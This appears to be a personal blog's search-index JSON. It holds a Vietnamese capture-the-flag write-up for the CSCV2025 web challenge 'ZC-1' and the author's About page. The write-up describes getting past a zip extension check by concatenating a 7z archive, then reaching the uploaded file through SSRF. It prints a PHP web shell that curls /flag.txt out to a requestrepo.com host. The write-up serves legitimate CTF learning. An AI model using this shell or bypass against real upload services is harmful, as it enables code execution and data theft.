[{"content":"⚔️ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ 🛰️Recon Tổng quan chung: Challenge bao gồm 2 ứng dụng web với:\napp1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080 app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong Chi tiết App1 Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):\nPOST /gateway/user : cho phép người đăng kí với các trường username, password POST /gateway/transport : cho phép người dùng đã xác thực upload file zip Endpoint này sử dụng thư viện zipfile trong python để thực hiện kiểm tra file extension của các file entry trong file zip được upload dựa trên whilelist trước khi gửi nó đến endpoint upload.php của app2 GET /gateway/health : nhận vào param module cho phép người dùng kiểm tra hoạt động của các endpoint tại app2 POST auth/token : thực hiện xác thực người dùng với username và password, trả vể session token (sử dụng cho việc xác thực) và refresh token App2 Ứng dụng bao gồm các endpoint sau\nPOST upload.php: cho phép upload file zip (từ app1) và thực hiện giải nén file zip và lưu các file sau khi đã giải nén trong folder upload/\u0026lt;user_id\u0026gt; health.php: một file rỗng chỉ nhằm mục đích kiểm tra kết nối, hoạt động của app2 🧪 Dig \u0026amp; Analyze Dựa trên cấu trúc của challenge, hệ thống cho phép upload file zip sau đó thực hiện giải nén và lưu trữ các file entry trong ứng dụng web Php (thư mục lưu trữ file không có cấu hình để ngăn việc thực thi file .php). Vậy mục tiêu challenge ở đây khả năng cao là upload web shell thông qua việc upload file zip chứa file entry nguy hiểm.\nDựa trên mục tiêu trên, có 2 vấn đề cần giải quyết:\n1. Làm thế nào để bypass được file extension check ở app1 -\u0026gt; Zip Concatenation Trong khi app1 thực hiện kiểm tra file zip upload với thư viện zipfile thì app2 lại sử dụng Archive7z\\Archive7z hay công cụ 7z để thực hiện giải nén file zip.\nBạn có thể chủ động tìm hiểu thêm về cấu trúc file zip để hiểu rõ hơn bài wriuteup, bài wriueup không đi sâu vào phân tích cấu trúc file zip hay giải thích cụ thể về lỗ hổng zip concatenation\nĐi vào chi tiết hơn cách mà 2 trình zip parser này hoạt động:\nĐối với python zipfile, trình đọc zip này không bắt đầu đọc từ đầu tệp mà thay vào đó, nó quét ngược từ cuối file để tìm kiếm lần lượt End of Central Directory, Central Directory, file entry dựa trên offset. Đối với 7z, định dạng này đặt signature và các header của nó ở đầu tệp. Công cụ 7z bắt đầu phân tích file zip từ đầu tệp (offset = 0) -\u0026gt; Điểm không đồng nhất ở đây cùng với hình ảnh mô tả của challenge gợi cho tôi ý tưởng về việc tận dụng điểm khác biệt của 2 trình zip parser để tạo một file zip hợp lệ với cả 2 trình parser tuy nhiên nội dung đọc được của chúng lại khác nhau bởi cơ chế phân tích của chúng khác nhau.\nTìm hiểu thêm một vài kĩ thuật tấn công liên quan đến định dạng file Zip tôi tìm được kĩ thuật Zip Concatenation phù hợp với tình huống lỗ hổng này\n2. Làm thế nào để có thể thực thi file php nếu đã upload được thành công -\u0026gt; SSRF Ứng dụng app1 cho phép kiểm tra hoạt động của backend tại endpoint GET /gateway/health. Endpoint này nhận vào params module, input này được nối chuỗi vào storage_url mà không qua kiểm tra sàng lọc dẫn đến có thể khai thác SSRF ở đây để gọi đến file php được upload -\u0026gt; Thực thi thành công file .php 🔥 Exploit Tạo payload Tạo file zip an toàn chứa các file entry phù hợp với whitelist của challenge echo helloworld \u0026gt; user.txt zip user.zip user.txt \u0026gt;/dev/null Tạo 7z archive chứa web shell echo \u0026#39;\u0026lt;?php system(\u0026#34;curl https://w4zhdt6e.requestrepo.com/ -F \\\u0026#34;file=@/flag.txt\\\u0026#34;\u0026#34;) ?\u0026gt;\u0026#39; \u0026gt; shell.php 7z a -t7z evil.7z shell.php \u0026gt;/dev/null File này có kích thước là 207 bytes (0xCF bytes)\nChỉnh sửa payload sao cho hợp lệ với zipfile Chúng ta sẽ thực hiện nối 2 file đơn giản bằng việc sử dụng lệnh cat\ncat evil.zip user.zip \u0026gt; zipconcat.zip Tuy nhiên file zip này chưa hợp lệ bởi việc thêm trước file zip một file 7z sẽ khiến offset của phần user.zip bị thay đổi, do đó cần thực hiện chỉnh sửa offset sao cho payload này hợp lệ với zipfile\nCác 2 vị trí offset cần thay đổi (9D bởi thêm vào trước file này 0x9D bytes) là:\noffset tới Central Directory: nằm trong phần End of Centrol directory có giá trị là 4D chỉnh sửa thành 11C = 4D + CF offset tới Local file Header nằm tại offset 42 tình từ đầu mỗi Central Directory có giá trị là 00 chỉnh sửa thành CF = 00 + CF Trực tiếp thay đổi offset bằng việc sử dụng hex editor\ncat evil.7z user.zip \u0026gt; zipconcat.zip Kiểm tra file với python zipfile Kiểm tra file zip với 7z Vì tập lệnh đặt tệp lưu trữ 7z ở ngay đầu tệp được kết hợp, nên các công cụ 7z sẽ coi tệp được kết hợp như một tệp lưu trữ 7z bình thường và trích xuất nội dung 7z (tệp PHP trong ví dụ của bạn) mà không cần động đến các cấu trúc ZIP được thêm vào phía dưới Mặc dù có thông báo lỗi bởi 7z phát hiện còn các bytes ở cuối file nhưng payload vẫn được giải nén thành công Thực hiện tấn công Tạo tài khoàn người dùng và lấy Authorization token (JWT):\nThực hiện upload file payload vừa tạo với Authorization header chứa token vừa lấy được\nThực hiện SSRF thể thực thi file php đã upload, tuy nhiên cần xác định được vị trí của file trên server\nFile sau khi extract được lưu tại thư mục upload/\u0026lt;user_id\u0026gt;, chúng ta có thể dễ dàng tìm được user id trong JWT token\nThực hiện SSRF\nMặc dù request trả về \u0026ldquo;ERR\u0026rdquo; nhưng chúng ta vẫn thành công lấy được flag\n🏆 EXP -\u0026gt; Zip Concatenation\n","permalink":"https://HaiNhat-HUST.github.io/ctf/cscv_2025/zc-1/","summary":"\u003ch1 id=\"-zc-1\"\u003e⚔️ ZC-1\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCategory:\u003c/strong\u003e Web\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty:\u003c/strong\u003e _\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuthor:\u003c/strong\u003e _\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDescription\u003c/strong\u003e: _\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eResource\u003c/strong\u003e: _\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image\" loading=\"lazy\" src=\"https://hackmd.io/_uploads/S1omJ7XAex.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"recon\"\u003e🛰️Recon\u003c/h1\u003e\n\u003ch2 id=\"tổng-quan-chung\"\u003eTổng quan chung:\u003c/h2\u003e\n\u003cp\u003eChallenge bao gồm 2 ứng dụng web với:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eapp1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080\u003c/li\u003e\n\u003cli\u003eapp2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"chi-tiết\"\u003eChi tiết\u003c/h2\u003e\n\u003ch3 id=\"app1\"\u003eApp1\u003c/h3\u003e\n\u003cp\u003eỨng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):\u003c/p\u003e","title":"CSCV2025 | Web | ZC-1"},{"content":" Tên: Le Hai Nhat Chức danh: Student / Pentester / (Redteamer) Vị trí: Việt Nam Tóm tắt ngắn Mình là Nhat\nKỹ năng Ngôn ngữ lập trình: Python, C, JavaScript (React, Node.js), Kotlin (Android). Web \u0026amp; DevOps: HTML, CSS, Hugo, Docker, Nginx. Bảo mật / CTF: Web (SSTI, XXE, SQLi, HTTP Smuggling) Công cụ: Burp Suite, Nmap, ffuf, Metasploit, Wireshark. Kinh nghiệm \u0026amp; Học tập Đang học/quan tâm: Web security, pentesting lab. Tham gia CTF, viết writeup cho các challenge về Web và Pwn. Dự án tiêu biểu Liên hệ Email: hainhat5423@gmail.com GitHub: github.com/HaiNhat-HUST Twitter/X: _ ","permalink":"https://HaiNhat-HUST.github.io/about/","summary":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eTên\u003c/strong\u003e: Le Hai Nhat\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eChức danh\u003c/strong\u003e: Student / Pentester / (Redteamer)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVị trí\u003c/strong\u003e: Việt Nam\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"tóm-tắt-ngắn\"\u003eTóm tắt ngắn\u003c/h2\u003e\n\u003cp\u003eMình là Nhat\u003c/p\u003e\n\u003ch2 id=\"kỹ-năng\"\u003eKỹ năng\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eNgôn ngữ lập trình:\u003c/strong\u003e Python, C, JavaScript (React, Node.js), Kotlin (Android).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWeb \u0026amp; DevOps:\u003c/strong\u003e HTML, CSS, Hugo, Docker, Nginx.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBảo mật / CTF:\u003c/strong\u003e Web (SSTI, XXE, SQLi, HTTP Smuggling)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCông cụ:\u003c/strong\u003e Burp Suite, Nmap, ffuf, Metasploit, Wireshark.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"kinh-nghiệm--học-tập\"\u003eKinh nghiệm \u0026amp; Học tập\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eĐang học/quan tâm: Web security, pentesting lab.\u003c/li\u003e\n\u003cli\u003eTham gia CTF, viết writeup cho các challenge về Web và Pwn.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"dự-án-tiêu-biểu\"\u003eDự án tiêu biểu\u003c/h2\u003e\n\u003ch2 id=\"liên-hệ\"\u003eLiên hệ\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eEmail: \u003ca href=\"mailto:hainhat5423@gmail.com\"\u003ehainhat5423@gmail.com\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eGitHub: github.com/HaiNhat-HUST\u003c/li\u003e\n\u003cli\u003eTwitter/X: _\u003c/li\u003e\n\u003c/ul\u003e","title":"About"}]